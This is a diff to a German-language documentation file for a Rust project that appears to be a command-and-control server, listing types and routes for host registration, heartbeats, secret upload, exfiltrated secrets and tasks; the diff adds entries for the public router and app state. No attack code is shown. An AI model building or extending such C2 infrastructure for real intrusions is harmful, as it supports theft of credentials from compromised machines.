@@ -47,6 +47,8 @@ Rollup aus [`src/`](./src/README.md):
   [src/main.rs:register], `HeartbeatRequest` [src/main.rs:heartbeat], `SecretUpload`
   [src/main.rs:upload_secret]; Antwort-Typen `c2::Host` [src/main.rs:list_hosts],
   `c2::ExfiltratedSecret` [src/main.rs:list_secrets], `c2::Task` [src/main.rs:list_tasks].
+- `pub fn app(state: AppState) -> Router` — der Router des Servers, oeffentlich [src/lib.rs:app]
+- `pub struct AppState` mit `db: Arc<Db>` und `token: Arc<String>` [src/lib.rs:AppState]
 - `pub struct Db` mit `open`, `upsert_host`, `list_hosts`, `upsert_secret`, `list_secrets`,
   `insert_task`, `update_task_result`, `list_tasks`; Datenmodelle `HostRow`, `SecretRow`, `TaskRow`
   [src/db.rs:Db] [src/db.rs:Db::open] [src/db.rs:HostRow] [src/db.rs:SecretRow]
